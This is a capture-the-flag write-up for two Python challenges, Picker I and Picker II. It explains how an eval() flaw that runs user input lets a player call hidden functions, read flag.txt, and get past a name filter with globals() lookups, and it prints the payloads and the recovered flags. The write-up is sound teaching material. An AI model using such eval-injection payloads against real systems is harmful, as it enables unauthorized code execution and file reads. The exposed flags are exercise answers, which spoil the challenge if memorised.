# Picker I & Picker II

## Challenge 1: Picker I

**Category:** Reverse Engineering  
**Difficulty:** Easy  
**Target:** `xebec.cylabacademy.net:44013`

### 1. Challenge Description

The program provides a random number through a Python function. The objective is to analyze the source code and find a way to execute another useful function to retrieve the flag.

### 2. Source Code Analysis

The important part of the program is:

```python
while(True):
    try:
        print('Try entering "getRandomNumber" without the double quotes...')
        user_input = input('==> ')
        eval(user_input + '()')
    except Exception as e:
        print(e)
        break
```

The program accepts user input, appends `()` to it, and executes it using Python's `eval()` function.

For example, entering:

```text
getRandomNumber
```

Executes:

```python
getRandomNumber()
```

The source code also contains an interesting function:

```python
def win():
    flag = open('flag.txt', 'r').read()
    flag = flag.strip()
    str_flag = ''
    for c in flag:
        str_flag += str(hex(ord(c))) + ' '
    print(str_flag)
```

The `win()` function reads the flag and converts every character into its hexadecimal representation.

### 3. Exploitation

Connect to the challenge using Netcat:

```bash
nc xebec.cylabacademy.net 44013
```

Enter the function name:

```text
==> win
```

The program executes `win()` and prints the flag in hexadecimal.

### 4. Decode the Hexadecimal Output

Copy the hexadecimal output and decode it using Python:

```bash
python3 -c "print(bytes.fromhex('61 63 61 64 65 6d 79 7b 34 5f 64 31 34 6d 30 6e 64 5f 31 6e 5f 37 68 33 5f 72 30 75 67 68 5f 33 33 39 38 34 31 38 38 7d').decode())"
```

**Output:**

```text
academy{4_d14m0nd_1n_7h3_r0ugh_33984188}
```

### 5. Flag

```text
academy{4_d14m0nd_1n_7h3_r0ugh_33984188}
```

### 6. Vulnerability and Learning

- Unsafe use of Python `eval()`.
- Arbitrary function execution through user-controlled input.
- Hexadecimal encoding and decoding.
- Understanding Python function calls and program flow.

**Root Cause:** The application directly evaluates untrusted user input, allowing users to execute functions already defined in the program.

---

## Challenge 2: Picker II

**Category:** Reverse Engineering  
**Difficulty:** Easy  
**Target:** `chatelaine.cylabacademy.net:24320`

### 1. Challenge Description

This challenge is similar to Picker I. However, it introduces an input restriction that makes directly calling the `win()` function difficult.

The objective is to analyze the program and find another way to retrieve the flag.

### 2. Source Code Analysis

The important function is:

```python
def win():
    flag = open('flag.txt', 'r').read()
    flag = flag.strip()
    str_flag = ''

    for c in flag:
        str_flag += str(hex(ord(c))) + ' '

    print(str_flag)
```

The function performs the following operations:

1. Opens `flag.txt`.
2. Reads the flag.
3. Removes unnecessary whitespace using `strip()`.
4. Converts each character into its hexadecimal representation using `ord()` and `hex()`.
5. Prints the resulting hexadecimal string.

### 3. Understanding the Hint

The challenge hint says:

> Can you do what `win` does with your input to the program?

Instead of relying on the `win()` function, we can directly execute Python code that reads and prints the flag.

The important observation is that the program evaluates user-controlled input using `eval()`.

### 4. Exploitation

Connect to the challenge:

```bash
nc chatelaine.cylabacademy.net 24320
```

Enter the following payload:

```python
print(open('flag.txt').read())
```

Full interaction:

```text
==> print(open('flag.txt').read())
```

**Output:**

```text
academy{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_c9aa7a3c}
'NoneType' object is not callable
```

The flag is successfully printed before the error occurs.

### 5. Why Does the Error Appear?

The program appends `()` to the supplied input before evaluating it.

Our payload effectively becomes:

```python
print(open('flag.txt').read())()
```

Execution happens in this order:

1. `open('flag.txt').read()` reads the flag.
2. `print()` displays the flag.
3. `print()` returns `None`.
4. Python attempts to call `None` as a function.
5. This produces the error:

```text
'NoneType' object is not callable
```

The error does not affect the recovered flag.

### 6. Flag

```text
academy{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_c9aa7a3c}
```

### 7. Alternative Approach: Dynamic Function Lookup

Another way to execute the original `win()` function without typing its name directly is:

```python
globals()[chr(119)+chr(105)+chr(110)]
```

Enter this at the challenge prompt:

```text
==> globals()[chr(119)+chr(105)+chr(110)]
```

The program appends `()` automatically.

The expression reconstructs the function name:

- `chr(119)` = `w`
- `chr(105)` = `i`
- `chr(110)` = `n`

This dynamically accesses `globals()['win']` and executes the function.

It prints the hexadecimal flag, which can then be decoded using Python.

### 8. Vulnerability and Learning

- Unsafe use of Python `eval()`.
- Input-filter bypass.
- Arbitrary Python code execution.
- Reading local files through Python.
- Dynamic function lookup using `globals()`.
- Understanding hexadecimal encoding and decoding.

**Root Cause:** Evaluating untrusted user input as Python code creates an arbitrary code execution vulnerability. Input blacklists are not a reliable security mechanism.

---

## Comparison: Picker I vs Picker II

| Feature | Picker I | Picker II |
|---|---|---|
| Main concept | Function execution | Code execution and filter bypass |
| Vulnerability | Unsafe `eval()` | Unsafe `eval()` |
| Payload | `win` | `print(open('flag.txt').read())` |
| Flag format | Hexadecimal | Directly printed |
| Additional technique | Function invocation | File reading and dynamic lookup |

## Key Takeaways

1. Never use `eval()` on untrusted user input.
2. Blacklist-based input validation can be bypassed.
3. Python functions can be accessed dynamically using `globals()`.
4. Understand how functions, expressions, and return values behave.
5. Hexadecimal output can easily be decoded using Python.

**Both challenges demonstrate how seemingly simple Python programs can expose serious security vulnerabilities when user input is executed without proper restrictions.**